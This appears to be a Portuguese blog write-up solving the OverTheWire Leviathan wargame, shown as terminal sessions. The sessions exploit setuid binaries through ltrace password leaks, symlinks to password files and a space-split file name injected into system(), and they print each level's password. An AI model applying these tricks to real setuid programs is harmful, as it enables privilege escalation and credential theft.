---
layout: post
title: OverTheWire - Leviathan
tags: 
 - writeups
 -  overthewire
address: "0x0002"
---

Seguindo a sequência do OverTheWire, vamos começar aqui o [Leviathan](http://overthewire.org/wargames/leviathan/).  
Tem bem menos níveis que o Bandit. Como é relativamente simples, vou guardar comentários só pra quando for necessário. A leitura dos comandos deverá ser auto-explicativa.

# Level 0

```

leviathan0@melinda:~$ ls
leviathan0@melinda:~$ ls -latrh
total 24K
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-rw-r--r--   1 root       root       3.6K Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
drwxr-xr-x   3 root       root       4.0K Nov 14  2014 .
drwxr-xr-x 167 root       root       4.0K Jul  9  2015 ..
drwxr-x---   3 leviathan1 leviathan0 4.0K Mar  8 21:29 .backup
leviathan0@melinda:~$ cd .backup/
leviathan0@melinda:~/.backup$ ls
bookmarks.html  wget123
leviathan0@melinda:~/.backup$ ls -R
.:
bookmarks.html  wget123

./wget123:
leviathan0@melinda:~/.backup$ cat bookmarks.html | grep leviathan
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | 
This will be fixed later, the password for leviathan1 is rioGegei8m" 
ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">
password to leviathan1</A>
```

# Level 1

```
leviathan0@melinda:~/.backup$ ssh leviathan1@localhost
leviathan1@melinda:~$ ls
check
leviathan1@melinda:~$ file check 
check: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV),
dynamically linked (uses shared libs), for GNU/Linux 2.6.24, 
BuildID[sha1]=0d17ae20f672ebc7d440bb4562277561cc60f2d0, not stripped
leviathan1@melinda:~$ ltrace ./check
__libc_start_main(0x804852d, 1, 0xffffd674, 0x80485f0 <unfinished ...>
printf("password: ")                                        = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642password: abcde
)                                                           = 97
getchar(0x8048680, 47, 0x804a000, 0x8048642)                = 98
getchar(0x8048680, 47, 0x804a000, 0x8048642)                = 99
strcmp("abc", "sex")                                        = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                                           = 29
+++ exited (status 0) +++
leviathan1@melinda:~$ ./check
password: sex
$ ls /etc/leviathan_pass                                      
leviathan0  leviathan1	leviathan2  leviathan3	
leviathan4  leviathan5	leviathan6  leviathan7
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
$ exit
```

# Level 2

```
leviathan1@melinda:~$ ssh leviathan2@localhost
leviathan2@melinda:~$ ls
printfile
leviathan2@melinda:~$ file printfile 
printfile: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), 
dynamically linked (uses shared libs), for GNU/Linux 2.6.24, 
BuildID[sha1]=d765b4023e214e3fbfe71aa63554713a57e39520, not stripped
leviathan2@melinda:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
leviathan2@melinda:~$ touch /tmp/318brfile
leviathan2@melinda:~$ ltrace ./printfile /tmp/318brfile
__libc_start_main(0x804852d, 2, 0xffffd654, 0x8048600 <unfinished ...>
access("/tmp/318brfile", 4)                                               = 0
snprintf("/bin/cat /tmp/318brfile", 511, "/bin/cat %s", "/tmp/318brfile") = 24
system("/bin/cat /tmp/318brfile" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                    = 0
+++ exited (status 0) +++
leviathan2@melinda:~$ rm /tmp/318brfile
leviathan2@melinda:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/318brfile
leviathan2@melinda:~$ touch /tmp/318brfile\ blabla
leviathan2@melinda:~$ ./printfile /tmp/318brfile\ blabla
Ahdiemoo1j
/bin/cat: blabla: No such file or directory
```

# Level 3

```
leviathan3@melinda:~$ ls -latrh
total 32K
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-rw-r--r--   1 root       root       3.6K Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-r-sr-x---   1 leviathan4 leviathan3 9.8K Mar 21  2015 level3
drwxr-xr-x   2 root       root       4.0K Mar 21  2015 .
drwxr-xr-x 167 root       root       4.0K Jul  9  2015 ..
leviathan3@melinda:~$ file level3 
level3: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), 
dynamically linked (uses shared libs), for GNU/Linux 2.6.24, 
BuildID[sha1]=9ee1bc84cc2a39de9df95a77cb807136b1ba6db2, not stripped
leviathan3@melinda:~$ ./level3 
Enter the password> abc
bzzzzzzzzap. WRONG
leviathan3@melinda:~$ ltrace ./level3
__libc_start_main(0x80485fe, 1, 0xffffd674, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                                        = -1
printf("Enter the password> ")                                    = 20
fgets(Enter the password> bla
"bla\n", 256, 0xf7fcbc20)                                         = 0xffffd46c
strcmp("bla\n", "snlprintf\n")                                    = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                                 = 19
+++ exited (status 0) +++
leviathan3@melinda:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
$ exit
```

# Level 4

```
leviathan4@melinda:~$ ls
leviathan4@melinda:~$ ls -latrh
total 24K
-rw-r--r--   1 root root        675 Apr  9  2014 .profile
-rw-r--r--   1 root root       3.6K Apr  9  2014 .bashrc
-rw-r--r--   1 root root        220 Apr  9  2014 .bash_logout
drwxr-xr-x   3 root root       4.0K Nov 14  2014 .
dr-xr-x---   2 root leviathan4 4.0K Nov 14  2014 .trash
drwxr-xr-x 167 root root       4.0K Jul  9  2015 ..
leviathan4@melinda:~$ cd .trash/
leviathan4@melinda:~/.trash$ ls
bin
leviathan4@melinda:~/.trash$ file bin 
bin: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), 
dynamically linked (uses shared libs), for GNU/Linux 2.6.24, 
BuildID[sha1]=3be0f50b480c24c4223fc43cca29ab377e140fc7, not stripped
leviathan4@melinda:~/.trash$ ./bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 
01100101 01101001 00001010
leviathan4@melinda:~/.trash$ for i in $(./bin); do 
 echo -n $(printf \\$(echo "ibase=2; obase=8; $i" | bc)) ; 
done; echo
Tith4cokei
```


# Level 5

```
leviathan5@melinda:~$ ls
leviathan5
leviathan5@melinda:~$ file leviathan5 
leviathan5: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), 
dynamically linked (uses shared libs), for GNU/Linux 2.6.24, 
BuildID[sha1]=c71b3ae0d0395851879ee6fb8ede92e1676ecf71, not stripped
leviathan5@melinda:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@melinda:~$ ./leviathan5 
UgaoFee4li
```


# Level 6

```
leviathan6@melinda:~$ ls
leviathan6
leviathan6@melinda:~$ file leviathan6 
leviathan6: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), 
dynamically linked (uses shared libs), for GNU/Linux 2.6.24, 
BuildID[sha1]=477bdc2883903e1a94b335e173c9149bc2755ab8, not stripped
leviathan6@melinda:~$ ./leviathan6 
usage: ./leviathan6 <4 digit code>
Wrong
Wrong
(...)
$ whoami
leviathan7
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
$ exit
Wrong
^C
leviathan6@melinda:~$ ssh leviathan7@localhost
leviathan7@melinda:~$ ls -latrh
total 24K
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
-rw-r--r--   1 root       root       3.6K Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-r--r-----   1 leviathan7 leviathan7  178 Nov 14  2014 CONGRATULATIONS
drwxr-xr-x   2 root       root       4.0K Nov 14  2014 .
drwxr-xr-x 167 root       root       4.0K Jul  9  2015 ..
leviathan7@melinda:~$ cat CONGRATULATIONS 
Well Done, you seem to have used a *nix system before, 
now try something more serious.
(Please don't post writeups, solutions or spoilers about 
the games on the web. Thank you!)
```

